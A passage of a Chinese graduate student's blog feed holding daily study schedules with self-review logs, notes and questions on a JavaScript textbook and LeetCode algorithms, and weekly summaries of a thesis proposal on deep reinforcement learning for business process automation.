]]), 20, -1, array([[ 1.73, 13.  ,  6.  ,  2.  ,  1.73, 11.  ]]), False, 0.0),<br>(array([[ 1.73, 13.  , -1.  , -1.  ,  1.73, 11.  ]]), 6, -1, array([[ 1.73, 13.  ,  6.  ,  0.  ,  1.73, 11.  ]]), False, 0.0), (array([[ 1.73, 12.  ,  1.  ,  1.  ,  1.73, 11.  ]]), 2, -1, array([[ 0.87, 12.5 ,  2.  ,  1.  ,  1.73, 11.  ]]), False, 0.0), (array([[ 1.73, 13.  , -1.  , -1.  ,  1.73, 11.  ]]), 17, -1, array([[ 4.33, 11.5 ,  3.  ,  3.  ,  1.73, 11.  ]]), False, 0.0), (array([[ 1.73, 13.  , -1.  , -1.  ,  1.73, 11.  ]]), 2, -1, array([[ 0.87, 13.5 ,  2.  ,  1.  ,  1.73, 11.  ]]), False, 0.0), (array([[ 1.73, 13.  , -1.  , -1.  ,  1.73, 11.  ]]), 10, -1, array([[ 3.46, 12.  ,  3.  ,  2.  ,  1.73, 11.  ]]), False, 0.0), (array([[ 1.73, 13.  , -1.  , -1.  ,  1.73, 11.  ]]), 9, -1, array([[ 0.  , 14.  ,  2.  ,  2.  ,  1.73, 11.  ]]), False, 0.0), (array([[ 1.73, 13.  , -1.  , -1.  ,  1.73, 11.  ]]), 17, -1, array([[ 4.33, 11.5 ,  3.  ,  3.  ,  1.73, 11.  ]]), False, 0.0), (array([[ 1.73, 13.  , -1.  , -1.  ,  1.73, 11.  ]]), 19, -1, array([[ 4.33, 14.5 ,  5.  ,  3.  ,  1.73, 11.  ]]), False, 0.0)]</p>]]></content>
      
      
      <categories>
          
          <category> graduate student time </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
            <tag> FE </tag>
            
            <tag> deep learning </tag>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022-5-19研究生的倒数第363天</title>
      <link href="/2022/05/19/2022-5-19%E7%A0%94%E7%A9%B6%E7%94%9F%E7%9A%84%E5%80%92%E6%95%B0%E7%AC%AC363%E5%A4%A9/"/>
      <url>/2022/05/19/2022-5-19%E7%A0%94%E7%A9%B6%E7%94%9F%E7%9A%84%E5%80%92%E6%95%B0%E7%AC%AC363%E5%A4%A9/</url>
      
        <content type="html"><![CDATA[<h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><ul><li><input disabled="" type="checkbox"> 9:40~10:20 今日学习学习            <strong><font color="#D2691E">JavaScript第三章Go On</font></strong></li><li><input disabled="" type="checkbox"> 10:20~10:50 今日学习学习            <strong><font color="#D2691E">JavaScript第三章Go On</font></strong></li><li><input disabled="" type="checkbox"> 10:50~11:20 LeetCode </li><li><input disabled="" type="checkbox"> 10:50~11:20 总结</li></ul><hr><ul><li><input disabled="" type="checkbox"> 14:00~15:00 今日学习安排            <strong><font color="#ff7500">第四章</font></strong></li><li><input disabled="" type="checkbox"> 15:00~16:00 今日学习安排            <strong><font color="#01274F">小论文</font></strong></li><li><input disabled="" type="checkbox"> 16:00~16:40 今日学习安排            <strong><font color="#2e4e7e">小论文</font></strong></li><li><input disabled="" type="checkbox"> 16:40~17:10 下午学习总结</li></ul><hr><ul><li><input disabled="" type="checkbox"> 18:30~20:00 无字幕版美剧</li><li><input disabled="" type="checkbox"> 20:00~21:30 晚上学习安排            <strong><font color="#8B008B">todo-5</font></strong></li><li><input disabled="" type="checkbox"> 21:30~22:10 晚上学习安排            <strong><font color="#7FFF00">todo-6</font></strong></li><li><input disabled="" type="checkbox"> 22:10~22:30 晚上学习总结</li></ul>]]></content>
      
      
      <categories>
          
          <category> graduate student time </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
            <tag> FE </tag>
            
            <tag> deep learning </tag>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022-5-18研究生的倒数第364天</title>
      <link href="/2022/05/18/2022-5-18%E7%A0%94%E7%A9%B6%E7%94%9F%E7%9A%84%E5%80%92%E6%95%B0%E7%AC%AC364%E5%A4%A9/"/>
      <url>/2022/05/18/2022-5-18%E7%A0%94%E7%A9%B6%E7%94%9F%E7%9A%84%E5%80%92%E6%95%B0%E7%AC%AC364%E5%A4%A9/</url>
      
        <content type="html"><![CDATA[<h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><ul><li><input disabled="" type="checkbox"> 10:20~10:50 leetcode             <strong><font color="#ff7500">leetcode</font></strong></li><li><input disabled="" type="checkbox"> 10:50~11:20 总结与反思</li></ul><hr><ul><li><input disabled="" type="checkbox"> 14:00~15:00 今日学习安排            <strong><font color="#ff7500">JavaScript高级程序设计第四章</font></strong></li><li><input disabled="" type="checkbox"> 15:00~16:00 今日学习安排            <strong><font color="#01274F">JavaScript第五章一半</font></strong></li><li><input disabled="" type="checkbox"> 16:00~16:40 今日学习安排            <strong><font color="#2e4e7e">小论文</font></strong></li><li><input disabled="" type="checkbox"> 16:40~17:10 下午学习总结</li></ul><hr><ul><li><input disabled="" type="checkbox"> 18:30~20:00 晚上学习安排            <strong><font color="#8B008B">小论文</font></strong></li><li><input disabled="" type="checkbox"> 20:00~21:30 晚上学习安排            <strong><font color="#8B008B">JavaScript第五章</font></strong></li><li><input disabled="" type="checkbox"> 21:30~22:10 晚上学习安排            <strong><font color="#7FFF00">英语</font></strong></li><li><input disabled="" type="checkbox"> 22:10~22:30 晚上学习总结与查漏补缺</li></ul><h1 id="DONE"><a href="#DONE" class="headerlink" title="DONE"></a>DONE</h1><p>行动目的：JavaScript第三章<br>开始时间：2022/5/18 9:53:55<br>任务耗时：0时,58分<br>★★★★C1：在整体任务进程中，事情已经完成到什么程度？<br>                 完成60%</p><p>★★★★C2：任务执行中间存在行动偏差，或被迫中断吗？下一步如何纠正？<br>                 内容太细太多比自己想的多<br>★★★★C3：恭喜你，再一次强化了自己的执行力。再接再厉，下一步继续做什么？让时间看得见，记录你的生命历程。<br>                 继续学习第三章<br>任务评价：2022/5/18 10:50:36■■■■■■□□□□60</p><hr><p>行动目的：继续学习第三章<br>开始时间：2022/5/18 10:50:36<br>任务耗时：0时,59分<br>★★★★C1：在整体任务进程中，事情已经完成到什么程度？<br>                 完成65%<br>★★★★C2：任务执行中间存在行动偏差，或被迫中断吗？下一步如何纠正？<br>                 看了一小会手机<br>★★★★C3：恭喜你，再一次强化了自己的执行力。再接再厉，下一步继续做什么？让时间看得见，记录你的生命历程。<br>                 继续完成这一阶段<br>任务评价：2022/5/18 11:48:47■■■■■■□□□□■■■■■■■□□□65</p><hr><p>行动目的：第三章，冲冲冲<br>开始时间：2022/5/18 14:49:27<br>任务耗时：1时,32分<br>★★★★C1：在整体任务进程中，事情已经完成到什么程度？<br>                 效果不是很好，去厕所了</p><p>★★★★C2：任务执行中间存在行动偏差，或被迫中断吗？下一步如何纠正？<br>                 嗯呢，生理条件不允许了，，，，<br>★★★★C3：恭喜你，再一次强化了自己的执行力。再接再厉，下一步继续做什么？让时间看得见，记录你的生命历程。<br>                 继续学习吧，晚上搞小论文<br>任务评价：2022/5/18 16:20:49■■■□□□□□□□30</p>]]></content>
      
      
      <categories>
          
          <category> graduate student time </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
            <tag> FE </tag>
            
            <tag> deep learning </tag>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022-5-17研究生的倒数第365天</title>
      <link href="/2022/05/17/2022-5-17%E7%A0%94%E7%A9%B6%E7%94%9F%E7%9A%84%E5%80%92%E6%95%B0%E7%AC%AC365%E5%A4%A9/"/>
      <url>/2022/05/17/2022-5-17%E7%A0%94%E7%A9%B6%E7%94%9F%E7%9A%84%E5%80%92%E6%95%B0%E7%AC%AC365%E5%A4%A9/</url>
      
        <content type="html"><![CDATA[<h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><ul><li><input disabled="" type="checkbox"> 14:00~15:00 今日学习安排            <strong><font color="#ff7500">JavaScript第二章</font></strong></li><li><input disabled="" type="checkbox"> 15:00~16:00 今日学习安排            <strong><font color="#01274F">JavaScript第三章</font></strong></li><li><input disabled="" type="checkbox"> 16:00~16:40 今日学习安排            <strong><font color="#2e4e7e">小论文实验</font></strong></li><li><input disabled="" type="checkbox"> 16:40~17:10 下午学习总结</li></ul><hr><ul><li><input disabled="" type="checkbox"> 18:30~20:00 无字幕版美剧</li><li><input disabled="" type="checkbox"> 20:00~21:30 晚上学习安排            <strong><font color="#8B008B">JavaScript第四章</font></strong></li><li><input disabled="" type="checkbox"> 21:30~22:10 晚上学习安排            <strong><font color="#7FFF00">JavaScript第五章</font></strong></li><li><input disabled="" type="checkbox"> 22:10~22:30 晚上学习总结</li></ul><h1 id="DONE"><a href="#DONE" class="headerlink" title="DONE"></a>DONE</h1><ol><li>todo-1</li></ol><p>★★★★C0：准确、清晰地描述全新的一天，第一个行动目的。<br>行动目的：JavaScript第二章<br>开始时间：2022/5/17 14:45:03<br>任务耗时：0时,48分<br>★★★★C1：在整体任务进程中，事情已经完成到什么程度？<br>                 只完成了百分之十，个人学习速度太慢了。<br>★★★★C2：任务执行中间存在行动偏差，或被迫中断吗？下一步如何纠正？<br>                 目标与实际能力不匹配<br>★★★★C3：恭喜你，再一次强化了自己的执行力。再接再厉，下一步继续做什么？让时间看得见，记录你的生命历程。<br>                 继续完成第一个TODO<br>任务评价：2022/5/17 15:32:08■■■□□□□□□□30</p><ol start="2"><li>todo-2</li></ol><p>行动目的：JavaScript第三章<br>开始时间：2022/5/17 19:52:18<br>任务耗时：1时,2分<br>★★★★C1：在整体任务进程中，事情已经完成到什么程度？<br>                 完成百分之二十吧<br>★★★★C2：任务执行中间存在行动偏差，或被迫中断吗？下一步如何纠正？<br>                 没有<br>★★★★C3：恭喜你，再一次强化了自己的执行力。再接再厉，下一步继续做什么？让时间看得见，记录你的生命历程。<br>                 下一个做小论文实验呀</p><p>任务评价：2022/5/17 20:53:50■■■□□□□□□□30<br>3. todo-2<br>行动目的：JavaScript第三章继续肝<br>开始时间：2022/5/17 20:55:50<br>任务耗时：0时,48分<br>★★★★C1：在整体任务进程中，事情已经完成到什么程度？<br>                 还短很大一块<br>★★★★C2：任务执行中间存在行动偏差，或被迫中断吗？下一步如何纠正？<br>                 看到最后看手机去了，，，，，<br>★★★★C3：恭喜你，再一次强化了自己的执行力。再接再厉，下一步继续做什么？让时间看得见，记录你的生命历程。<br>                 学个算法吧</p><p>任务评价：2022/5/17 21:42:37■■■■■□□□□□50</p>]]></content>
      
      
      <categories>
          
          <category> graduate student time </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
            <tag> FE </tag>
            
            <tag> deep learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode算法学习</title>
      <link href="/2022/05/17/LeetCode%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/05/17/LeetCode%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="总述"><a href="#总述" class="headerlink" title="总述"></a>总述</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="master公式，计算时间复杂度"><a href="#master公式，计算时间复杂度" class="headerlink" title="master公式，计算时间复杂度"></a>master公式，计算时间复杂度</h3><p><img src="http://files.shanqianche.cn/20227/1656895833852.png" alt="时间复杂度"></p><p>$N^{d}$为剩余空间复杂度，master公式思想就是取时间或空间时间复杂度最大值。</p><h3 id="对数器，对算法进行测试"><a href="#对数器，对算法进行测试" class="headerlink" title="对数器，对算法进行测试"></a>对数器，对算法进行测试</h3><hr><p>0.有一个你想测试的方法a</p><p>1.实现一个绝对正确但是时间复杂度不好的方法b</p><p>2.实现一个随机样本产生器</p><p>3.实现比对的方法</p><p>4.把方法a和方法b比对很多次来验证方法a是否正确</p><p>5.如果有一个样本比对出错，打印样本分析是哪个方法出错</p><p>6.当样本数量很多时，比对测试依然正确，可以确定方法a已经正确。</p><hr><h3 id="树"><a href="#树" class="headerlink" title="树"></a>树</h3><ol><li>完全二叉树</li></ol><p>长度size的完全二叉树，左节点为（2i+1）/2，右节点为（2i+2）/2，根为（i-1）/2</p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><h3 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h3><ol><li><p>随机排序中的partition理解一下</p></li><li><p>总结</p></li></ol><p><img src="http://files.shanqianche.cn/20227/1656982584796.png" alt="排序"></p><p><img src="http://files.shanqianche.cn/20227/1656983964217.png" alt="总结"></p><p><img src="http://files.shanqianche.cn/20227/1656984335881.png" alt="坑"></p><ol start="3"><li>排序在工业上的优化<ul><li>充分利用O(N*logN)和O(N^2)排序的各自优势</li></ul></li></ol><p><em><font color="#9932CC">在大样本量下使用快排的调度思想进行递归，在小样本下使用插入排序，虽然为O（N^2）但是，插入排序常熟项低速度更快。</font></em><br>    - 稳定性的考虑<br><em><font color="#9932CC">排序的优势</font></em></p><h3 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h3><h3 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h3>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript高级程序设计第四版</title>
      <link href="/2022/05/16/JavaScript%E9%AB%98%E7%BA%A7%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%AC%AC%E5%9B%9B%E7%89%88/"/>
      <url>/2022/05/16/JavaScript%E9%AB%98%E7%BA%A7%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%AC%AC%E5%9B%9B%E7%89%88/</url>
      
        <content type="html"><![CDATA[<h1 id="戴师帮忙选的important-point"><a href="#戴师帮忙选的important-point" class="headerlink" title="戴师帮忙选的important point"></a>戴师帮忙选的important point</h1><p><img src="http://files.shanqianche.cn/20225/1652971169338.png" alt="important point page-1"></p><p><img src="http://files.shanqianche.cn/20225/1652971169333.png" alt="important point page-2"></p><p><img src="http://files.shanqianche.cn/20225/1652971169335.png" alt="important point page-3"></p><p><img src="http://files.shanqianche.cn/20225/1652971169334.png" alt="important point page-4"></p><p><img src="http://files.shanqianche.cn/20225/1652971169337.png" alt="important point page-5"></p><p><img src="http://files.shanqianche.cn/20225/1652971169336.png" alt="important point page-6"></p><p><img src="http://files.shanqianche.cn/20225/1652971169339.png" alt="important point page-7"></p><p><img src="http://files.shanqianche.cn/20225/1652971169340.png" alt="important point page-8"></p><p><img src="http://files.shanqianche.cn/20225/1652971169411.png" alt="important point page-9"></p><p><img src="http://files.shanqianche.cn/20225/1652971169408.png" alt="important point page-X"></p><h1 id="第二章-HTML-中的-JavaScript"><a href="#第二章-HTML-中的-JavaScript" class="headerlink" title="第二章 HTML 中的 JavaScript"></a>第二章 HTML 中的 JavaScript</h1><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ol><li>第2.1中提到type中设置为module，代码当成了<font color="#8B0000">ES6模块</font>，需要实践来验证。</li></ol><p><img src="http://files.shanqianche.cn/20225/1652971169412.png" alt="script标签中type属性"></p><ol start="2"><li>第2.1中提到浏览器不会对文件扩展名进行检测，为服务器<font color="#8B0000">动态生成js</font>提供可能性，不是很理解。</li></ol><p><img src="http://files.shanqianche.cn/20225/1652971169413.png" alt="不对文件后缀检测的作用"></p><ol start="3"><li>第2.1不是很懂其中提到的<font color="#8B0000">MIME</font>的作用及判断原理</li></ol><p><img src="http://files.shanqianche.cn/20225/1652971169416.png" alt="返回正确MIME类型"></p><ol start="4"><li>第2.1中提到src中url的请求策略，不理解<font color="#bf242a">同源策略</font></li></ol><p><img src="http://files.shanqianche.cn/20225/1652971169414.png" alt="src的请求策略，以及返回的JavaScript的受限规则"></p><ol start="5"><li>第2.1.2中推迟脚本执行中提到DOMContentLoad事件，没见过，下次学习一下HTML</li></ol><p><img src="http://files.shanqianche.cn/20225/1652971169421.png" alt="delay属性设置后依旧会在DOMContentLoad事件之前执行"></p><ol start="6"><li>第2.1.3async可以保证脚本在<font color="#E9967A">页面load事件之前执行</font></li></ol><p><img src="http://files.shanqianche.cn/20225/1652971169415.png" alt="async在页面中的执行顺序"></p><h2 id="理解与解决"><a href="#理解与解决" class="headerlink" title="理解与解决"></a>理解与解决</h2><h1 id="第三章语言基础"><a href="#第三章语言基础" class="headerlink" title="第三章语言基础"></a>第三章语言基础</h1><h2 id="学习与反思"><a href="#学习与反思" class="headerlink" title="学习与反思"></a>学习与反思</h2><ol><li>声明的提升</li></ol><p><img src="http://files.shanqianche.cn/20225/1652971169420.png" alt="var声明提升"></p><ol start="2"><li><p>补充：<font color="#8B0000"><a href="https://www.javascripttutorial.net/javascript-event-loop/">Event Loop</a></font></p></li><li><p>var，let与const在for中的使用</p></li></ol><p><img src="http://files.shanqianche.cn/20225/1652971169419.png" alt="for循环"></p><p>setTimeOut会在for循环结束后进行输出，var在这里读取的是一个全局变了 $i$ ,所有只会输出五，但是JavaScript引擎会为for循环中的let声明分别创建独立的变量实例，所以有五个 $i$ 进行输出。</p><p><img src="http://files.shanqianche.cn/20225/1652971169494.png" alt="for中的let"></p><p><img src="http://files.shanqianche.cn/20225/1652971169495.png" alt="for中的const"></p><h2 id="问题与解释"><a href="#问题与解释" class="headerlink" title="问题与解释"></a>问题与解释</h2><ol><li>第3.4.5中提到八进制和十六进制在数学操作中都被视为十进制，什么意思？</li></ol><p><img src="http://files.shanqianche.cn/20225/1652971169496.png" alt="八进制和十六进制的运算方式"><br>答：都转化为十进制再进行计算。</p><ol start="2"><li>第3.4.7中为什么要避免Symbol()包装对象？</li></ol><p><img src="http://files.shanqianche.cn/20225/1652971169497.png" alt="Symbol()无法包装对象"><br>解：对象是引用类型，返回的是指针，针对同一类型的对象是同一个指针，这就与Symbol（）矛盾了。<br>3. 第3.4.7.4的使用Symbol实现异步迭代以及后续的内容不是很懂。</p><p><img src="http://files.shanqianche.cn/20225/1652971169498.png" alt="相关异步的问题"><br>解：重构了迭代函数<br>4. 第3.4.7.16中with环境啥意思</p><p>解：</p><p><img src="http://files.shanqianche.cn/20225/1652971169499.png" alt="with的使用"></p><ol start="5"><li>第3.6.7中标签语句进行学习</li></ol><p><img src="http://files.shanqianche.cn/20225/1652971169500.png" alt="标签语句"><br>解：</p><h1 id="第四章变量、作用域与内存"><a href="#第四章变量、作用域与内存" class="headerlink" title="第四章变量、作用域与内存"></a>第四章变量、作用域与内存</h1><h2 id="问题与解"><a href="#问题与解" class="headerlink" title="问题与解"></a>问题与解</h2><ol><li>第4.2.2中let与var的提升的区别，let提升出现暂时性死区啥意思？</li></ol><p><img src="http://files.shanqianche.cn/20226/1655395936285.png" alt="let与var的hoisting"><br>2. 第4.3.4.3中提到内存泄漏的原因，那么如何检测内存泄漏呢？</p><h1 id="第五章基本引用类型"><a href="#第五章基本引用类型" class="headerlink" title="第五章基本引用类型"></a>第五章基本引用类型</h1><ol><li>引用值与传统面向对象编程语言中的类相似，但实现不同？<b>理解</b></li></ol><h1 id="第六章集合引用类型"><a href="#第六章集合引用类型" class="headerlink" title="第六章集合引用类型"></a>第六章集合引用类型</h1><ol><li>第6.2.4中提到会出现无法判断一个对象是否为数组的现象？</li></ol><p><img src="http://files.shanqianche.cn/20226/1655908202281.png" alt="无法判断是否为数组"></p><ol start="2"><li>第6.2.13中迭代器的作用域对象的使用。</li></ol><p><a href="https://blog.csdn.net/qq_35087256/article/details/79658253">相关文档</a></p><p><img src="http://files.shanqianche.cn/20226/1656118450989.png" alt="作用域对象"></p><ol start="3"><li>第6.3.4中提到的上溢和下溢不是很懂。</li></ol><p><img src="http://files.shanqianche.cn/20226/1656257982512.png" alt="解决上溢下溢问题"><br>4. 第6.9中，“每种包装类型都映射到同名的原始类型”什么意思？<br>5. 第6.9中，“在以读模式访问原始值时，后台会实例化一个原始值包装对象，通过这个对象可以操作数据。”？<br>6. 第6.9中，“涉及原始值的语句只要一执行完毕，包装对象就会立即销毁。”？</p><h1 id="第七章迭代器与生成器"><a href="#第七章迭代器与生成器" class="headerlink" title="第七章迭代器与生成器"></a>第七章迭代器与生成器</h1><h2 id="问题与解决"><a href="#问题与解决" class="headerlink" title="问题与解决"></a>问题与解决</h2><ol><li>第7.3.2.4中描述到yied*实现递归，没看懂代码</li></ol><p><img src="http://files.shanqianche.cn/20226/1656581774389.png" alt="enter description here"></p><h1 id="第八章对象、类与面向对象变成"><a href="#第八章对象、类与面向对象变成" class="headerlink" title="第八章对象、类与面向对象变成"></a>第八章对象、类与面向对象变成</h1><ol><li>第8.1.7中对象结构中提到解构在内部使用函数这块不是很懂</li></ol><p><img src="http://files.shanqianche.cn/20227/1656743508866.png" alt="解构在内部使用函数"></p><p><strong><font color="#FF1493">结构这的语法糖还是比较怪的，建议都看</font></strong></p><ol start="2"><li>第8.3.2.2中提到盗用构造函数的缺点不是很理解 <img src="https://files.shanqianche.cn/20227/1657633886960.png" alt="缺点"> <img src="https://files.shanqianche.cn/20227/1657633898659.png" alt="缺点"></li><li>第8.3.4中原型式的继承不是很懂作用</li></ol><p><img src="https://files.shanqianche.cn/20227/1657635961798.png" alt="原型式继承"><br>3. 第8.3.6中寄生组合继承，重新梳理一下继承中的逻辑</p><p><img src="https://files.shanqianche.cn/20227/1657637338484.png" alt="理论"></p><p><img src="https://files.shanqianche.cn/20227/1657637456555.png" alt="为什么说只调用一次"><br>4. 第8.4.4.5中类混入提到利用辅助函数进行展开嵌套，不是很懂原理和作用。</p><p><img src="https://files.shanqianche.cn/20227/1657711373381.png" alt="展开嵌套"></p><h1 id="第九章代理与反射"><a href="#第九章代理与反射" class="headerlink" title="第九章代理与反射"></a>第九章代理与反射</h1><ol><li>第9.1.6.2中提到使用反射不在抛错而是返回false，与实际代码不一样。</li></ol><p><img src="https://files.shanqianche.cn/20227/1657938559413.png" alt="文档"></p><p><img src="https://files.shanqianche.cn/20227/1657938590087.png" alt="实际演示"></p><h1 id="第十章函数"><a href="#第十章函数" class="headerlink" title="第十章函数"></a>第十章函数</h1><ol><li>第10.14闭包的作用和定义依旧不是很懂</li><li>第10.14.1中this对象的作用域不清楚</li></ol><p><img src="http://files.shanqianche.cn/20227/1658048008355.png" alt="this对象的作用域"></p><ol start="3"><li>第10.14.2中</li></ol><p><img src="http://files.shanqianche.cn/20227/1658049551215.png" alt="闭包问题"></p><ol start="4"><li>第10.15，10.16都不是很懂了</li></ol><h1 id="期约和异步函数"><a href="#期约和异步函数" class="headerlink" title="期约和异步函数"></a>期约和异步函数</h1><ol><li>第11.2.4.4中对于reduce的使用不是很懂</li></ol><p><img src="http://files.shanqianche.cn/20227/1658200969767.png" alt="promise+reduce"></p><p><img src="http://files.shanqianche.cn/20227/1658201198623.png" alt="promise reduce"></p><ol start="2"><li>第11.2.5.1中期约的取消，实现这块函数不是很懂</li></ol><p><img src="http://files.shanqianche.cn/20227/code.png" alt="期约取消功能的实现"></p><h1 id="第十四"><a href="#第十四" class="headerlink" title="第十四"></a>第十四</h1><ol><li>第14.3.3 微任务队列及为啥处理两次</li></ol><p><img src="https://files.shanqianche.cn/20227/1658421089137.png" alt="记录队列"></p><h1 id="第二十章"><a href="#第二十章" class="headerlink" title="第二十章"></a>第二十章</h1><ol><li>第20.9.2，3，4看不懂可读流，可写流和转换流</li></ol><h1 id="第二十四章"><a href="#第二十四章" class="headerlink" title="第二十四章"></a>第二十四章</h1><ol><li>第24.6中fetch API的数据绑定不是很懂，尤其stream那块</li></ol>]]></content>
      
      
      <categories>
          
          <category> FE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> front-end </tag>
            
            <tag> plan </tag>
            
            <tag> JavaScript </tag>
            
            <tag> book </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021-11-30【周总结】</title>
      <link href="/2021/11/30/2021-11-30%E3%80%90%E5%91%A8%E6%80%BB%E7%BB%93%E3%80%91/"/>
      <url>/2021/11/30/2021-11-30%E3%80%90%E5%91%A8%E6%80%BB%E7%BB%93%E3%80%91/</url>
      
        <content type="html"><![CDATA[<h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><ul><li><input checked="" disabled="" type="checkbox"> 完成开题整体结构</li><li><input checked="" disabled="" type="checkbox"> 修改开题依据和研究内容</li><li><input checked="" disabled="" type="checkbox"> 调研增强学习的探索方式，并选取适合开题的方式</li><li><input checked="" disabled="" type="checkbox"> 完善开题中关于页面元素映射的相关思路</li></ul><h1 id="DONE"><a href="#DONE" class="headerlink" title="DONE"></a>DONE</h1><ol><li>根据上次开题反馈以及后期选取的研究点，重新构建了新的研究方向和开题内容，主要研究的是业务流程智能化，即对于流程策略的优化</li><li>经过上次演讲和老师辅导，反思自己在研究背景，研究意义以及趋势的书写错误进行改正。这块应该是正对业务流程发展进行描写，而不是描写后面对于模型的改进。</li><li>调研了目前主要的几种探索方式，包括了持续的随机的探索方式以及其改进，和通过监控环境的方式来进行探索。最后结合业务流程自动化的场景可能随时变化，同时页面元素复杂，通过监督的方式进行探索花费的资源比较大，所以选择了持续的一种探索方式，通过加入动作噪声来进行探索。</li><li>对于页面元素映射的算法进行了研究，结合页面元素本身定位复杂，同时不同页面的元素结构不同，这就导致一些对于数据结构要求固定的算发无法被应用到。我们直接采用顺序的元素捕获方式，将其有序映射到固定表单。</li></ol>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> weekly </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021-11-21【周总结】</title>
      <link href="/2021/11/21/2021-11-21%E3%80%90%E5%91%A8%E6%80%BB%E7%BB%93%E3%80%91/"/>
      <url>/2021/11/21/2021-11-21%E3%80%90%E5%91%A8%E6%80%BB%E7%BB%93%E3%80%91/</url>
      
        <content type="html"><![CDATA[<h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><ul><li><input checked="" disabled="" type="checkbox"> 构建开题中的部分研究点</li><li><input checked="" disabled="" type="checkbox"> 阅读和理解强化学习与深度学习相结合的模型DPG和DDPG</li><li><input checked="" disabled="" type="checkbox"> 重新梳理开题的研究背景和内容等</li></ul><h1 id="DONE"><a href="#DONE" class="headerlink" title="DONE"></a>DONE</h1><p>1、重新修改开题题目，将业务流程自动化最优制定策略提取出来作为专门的研究点展开研究，研究过程中，发现深度学习模型仅仅是可以学习到已有的、被大部分沿用的流程策略，只能帮助员工进行流程制作，而无法对已有的流程进行优化，所以进行了进一步研究，发现策略优化是强化学习的一个重要研究点。所以加深了对于强化学习的研究，在研究过程中发现，简单的强化学习无法对于样本利用率低，同时针对业务流程这样的生产环境发现，强化学习模型无法存储这么多&lt;状态-动作&gt;,所以又引入深度学习，主要是RNN模型来存储离散的序列，这样就可以有效提升业务流程过程中的优化。其中还有很多需要克服的问题，后期会一一提出，并寻找解决方法。<br>2、第二部分是对于两个主流的深度增强学习模型进行学习。进行比较学习了两个模型的优缺和演变过程。<br>3、这一部分是听取老师的建议后进行了重新修改开题的结构，上次演讲过后进行反思，认为自己的整体结构确实比较散乱，既没有以流程自动化为中心进行研究，也没有将深度学习与强化学习的结合融汇到一块，所以其它同学没有听懂我要做什么，所有又进一步进行了修改整体脉络。</p>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> weekly </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021-11-16【周总结】</title>
      <link href="/2021/11/16/2021-11-16%E3%80%90%E5%91%A8%E6%80%BB%E7%BB%93%E3%80%91/"/>
      <url>/2021/11/16/2021-11-16%E3%80%90%E5%91%A8%E6%80%BB%E7%BB%93%E3%80%91/</url>
      
        <content type="html"><![CDATA[<h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><ul><li><input checked="" disabled="" type="checkbox"> 强化学习</li><li><input checked="" disabled="" type="checkbox"> 深度学习在深度强化学习的作用</li><li><input disabled="" type="checkbox"> 开题准备</li></ul><h1 id="DONE"><a href="#DONE" class="headerlink" title="DONE"></a>DONE</h1><ol><li>学习了强化学习中关于离策略近似方法、资格迹和策略梯度方法。同时阅读了《自适应序列生成的建筑能耗预测》</li><li>学习了DQN，DP以及DDPG模型</li><li>主要针对构建策略函数、价值函数的构建进行了深入研究，同时由于主要考虑了**==强化学习在Web场景中进行广义探索探索方式 #F44336==** ，同时在Web场景中状态的数量也很多，提出使用==高维数 #F44336==据来记录代理机器人状态，通过映射函数记录状态与动作的映射关系。</li></ol>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> weekly </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
